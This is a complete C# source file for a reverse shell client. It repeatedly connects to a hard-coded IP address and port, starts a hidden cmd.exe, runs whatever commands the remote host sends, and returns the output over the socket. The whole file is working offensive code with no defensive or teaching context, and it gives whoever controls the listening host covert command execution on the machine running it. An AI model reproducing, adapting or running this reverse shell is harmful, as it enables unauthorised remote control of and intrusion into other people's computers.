using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ReverseShellClient
{
    class Program
    {

        static StreamWriter streamWriter;
        static TcpClient tcpClient;
        static NetworkStream networkStream;
        static StreamReader streamReader;
        static Process processCmd;
        static StringBuilder strInput;

        static void Main(string[] args)
        {
            int port = args.Length > 0 ? int.Parse(args[0]) : 6666;

            string[] ips = {
                "192.168.100.2"
            };
            int ipIndex = 0;

            while (true)
            {
                string tryIp = ips[ipIndex];
                ipIndex = (ipIndex + 1) % ips.Length;
                Console.WriteLine($"Trying to connect to {tryIp} on port {port}");

                ConnectToServer(tryIp, port);
                System.Threading.Thread.Sleep(15000); //Wait 15 seconds 
            }
        }

        private static void ConnectToServer(string ip, int port)
        {
            tcpClient = new TcpClient();
            strInput = new StringBuilder();

            try
            {
                IPAddress ipAdress = IPAddress.Parse(ip);
                tcpClient.Connect(ipAdress, port);

                Console.WriteLine("Connected");

                //put your preferred IP here
                networkStream = tcpClient.GetStream();
                streamReader = new StreamReader(networkStream);
                streamWriter = new StreamWriter(networkStream);
            }
            catch (Exception err)
            {
                Console.WriteLine(err.Message);
                return;
            } //if no Client don't continue 

            processCmd = new Process();
            processCmd.StartInfo.FileName = "cmd.exe";
            processCmd.StartInfo.CreateNoWindow = true;
            processCmd.StartInfo.UseShellExecute = false;
            processCmd.StartInfo.RedirectStandardOutput = true;
            processCmd.StartInfo.RedirectStandardInput = true;
            processCmd.StartInfo.RedirectStandardError = true;
            processCmd.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
            processCmd.Start();
            processCmd.BeginOutputReadLine();

            while (true)
            {
                try
                {
                    strInput.Append(streamReader.ReadLine());
                    strInput.Append("\n");
                    if (strInput.ToString().LastIndexOf("terminate") >= 0)
                    {
                        StopServer();
                    }
                    if (strInput.ToString().LastIndexOf("exit") >= 0)
                    {
                        throw new ArgumentException();
                    }

                    processCmd.StandardInput.WriteLine(strInput);
                    strInput.Remove(0, strInput.Length);
                }
                catch (Exception)
                {
                    Cleanup();
                    break;
                }
            }
        }
        private static void Cleanup()
        {
            try
            {
                processCmd.Kill();
            }
            catch (Exception)
            {
            };

            streamReader.Close();
            streamWriter.Close();
            networkStream.Close();
        }

        private static void StopServer()
        {
            Cleanup();
            System.Environment.Exit(System.Environment.ExitCode);
        }

        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception) { }
            }
        }
    }

}
